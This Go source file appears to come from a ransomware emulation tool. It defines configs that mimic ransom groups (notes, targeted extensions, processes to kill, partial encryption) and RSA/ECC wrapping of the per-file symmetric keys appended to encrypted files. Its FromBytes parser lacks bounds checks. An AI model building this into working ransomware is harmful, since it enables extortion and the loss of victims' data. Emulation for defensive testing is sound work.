package main

import (
	"crypto/elliptic"
	"crypto/rsa"
	"encoding/binary"
	"fmt"
	"github.com/Anonghost720/ecc"
)

type Config struct {
	Groups                  []RansomActor `yaml:"groups"`
	DirectoryExclusions     []string      `yaml:"directory_skips"`
	FileExtensionExclusions []string      `yaml:"file_extension_skips"`
	FileNameExclusions      []string      `yaml:"file_name_skips"`
	ProcessKillNames        []string      `yaml:"process_kill_names"`
	FileExtensionInclusions []string      `yaml:"file_extension_targets"`
	MaxSizeFullEncryption   int64         `yaml:"full_encryption_max_bytes"`
	EncryptionPercent       int           `yaml:"encryption_percentage"`
}

type RansomActor struct {
	Group           string   `yaml:"group"`
	ExtensionMethod string   `yaml:"extension_method"`
	Extensions      []string `yaml:"extensions"`
	Notes           []string `yaml:"notes"`
	Note            string   `yaml:"note"`
	Cipher          string   `yaml:"cipher"`
	AsymCipher      string   `yaml:"asym"`
}

type LogLevel string

const (
	INFO  LogLevel = "INFO"
	ERROR LogLevel = "ERROR"
)

type File struct {
	Path string // full path
	Size int64  // bytes
}

type AsymKeyHandler struct {
	RSAPublicKey      *rsa.PublicKey
	RSAPublicKeyFile  string
	RSAPrivateKey     *rsa.PrivateKey
	RSAPrivateKeyFile string
	ECCPublicKey      *ecc.Public
	ECCPublicKeyFile  string
	ECCPrivateKey     *ecc.Private
	ECCPrivateKeyFile string
	System            string
}

// Encrypt will encrypt the provided message with the appropriate key system in use
func (e AsymKeyHandler) Encrypt(a ExtraDataStore) ([]byte, error) {
	// Our usecase only cares about encrypting/decrypting the ExtraDataStore for each file and returning to the caller
	// We are not validating here as we assume it is already correctly prepared
	bytes := a.ToBytes()
	if e.System == "rsa" {
		ct, err := EncryptRSA(e.RSAPublicKey, bytes, nil)
		if err != nil {
			return nil, err
		} else {
			return ct, nil
		}
	} else if e.System == "ecc" {
		ct, err := e.ECCPublicKey.Encrypt(bytes)
		if err != nil {
			return nil, err
		} else {
			return ct, nil
		}
	} else {
		return nil, fmt.Errorf("Asym system not implemented: %s", e.System)
	}
	// Caller will determine total ct length and will append this as a uint32 byte to the remainder of the file
	// When decrypting, caller will first identify total length
	// Caller will then read the necessary bytes and pass bytes representing the EDS to the Decrypter
}

func (e AsymKeyHandler) Decrypt(ct []byte) (ExtraDataStore, error) {
	// This will receive bytes representing an encrypted EDS and first decrypt then parse into EDS
	eds := ExtraDataStore{
		LengthSymmetricKey:   0,
		SymmetricKey:         nil,
		LengthSymmetricNonce: 0,
		SymmetricNonce:       nil,
		PercentEncrypted:     0,
	}
	var err error
	pt := make([]byte, 0)
	if e.System == "rsa" {
		pt, err = DecryptRSA(e.RSAPrivateKey, ct, nil)
		if err != nil {
			return eds, err
		}
	} else if e.System == "ecc" {
		pt, err = e.ECCPrivateKey.Decrypt(ct, elliptic.P521())
		if err != nil {
			return eds, err
		}
	} else {
		return eds, fmt.Errorf("Asym system not implemented: %s", e.System)
	}
	err = eds.FromBytes(pt)
	if err != nil {
		return ExtraDataStore{}, err
	}
	return eds, nil

}

type ExtraDataStore struct {
	LengthSymmetricKey      int64
	SymmetricKey            []byte
	LengthSymmetricNonce    int64
	SymmetricNonce          []byte
	PercentEncrypted        int32
	OriginalExtensionLength int32
	OriginalExtension       string
}

func (e ExtraDataStore) ToBytes() []byte {
	symmetricKeyLength := make([]byte, 8)
	binary.LittleEndian.PutUint64(symmetricKeyLength, uint64(e.LengthSymmetricKey))
	symmetricNonceLength := make([]byte, 8)
	binary.LittleEndian.PutUint64(symmetricNonceLength, uint64(e.LengthSymmetricNonce))
	percentEncrypted := make([]byte, 4)
	binary.LittleEndian.PutUint32(percentEncrypted, uint32(e.PercentEncrypted))
	originalExtensionLength := make([]byte, 4)
	binary.LittleEndian.PutUint32(originalExtensionLength, uint32(e.OriginalExtensionLength))
	originalExtension := []byte(e.OriginalExtension)
	bytes := make([]byte, 0)
	bytes = append(bytes, symmetricKeyLength...)
	bytes = append(bytes, e.SymmetricKey...)
	bytes = append(bytes, symmetricNonceLength...)
	bytes = append(bytes, e.SymmetricNonce...)
	bytes = append(bytes, percentEncrypted...)
	bytes = append(bytes, originalExtensionLength...)
	bytes = append(bytes, originalExtension...)
	return bytes
}

func (e *ExtraDataStore) FromBytes(bytes []byte) error {
	// TODO error checks on length
	e.LengthSymmetricKey = int64(binary.LittleEndian.Uint64(bytes[0:8]))
	e.SymmetricKey = bytes[8 : e.LengthSymmetricKey+8]
	e.LengthSymmetricNonce = int64(binary.LittleEndian.Uint64(bytes[e.LengthSymmetricKey+8 : e.LengthSymmetricKey+8+8]))
	e.SymmetricNonce = bytes[e.LengthSymmetricKey+8+8 : e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce]
	e.PercentEncrypted = int32(binary.LittleEndian.Uint32(bytes[e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce : e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4]))
	e.OriginalExtensionLength = int32(binary.LittleEndian.Uint32(bytes[e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4 : e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4+4]))
	e.OriginalExtension = string(bytes[e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4+4 : e.LengthSymmetricKey+8+8+e.LengthSymmetricNonce+4+4+int64(e.OriginalExtensionLength)])
	return nil
}
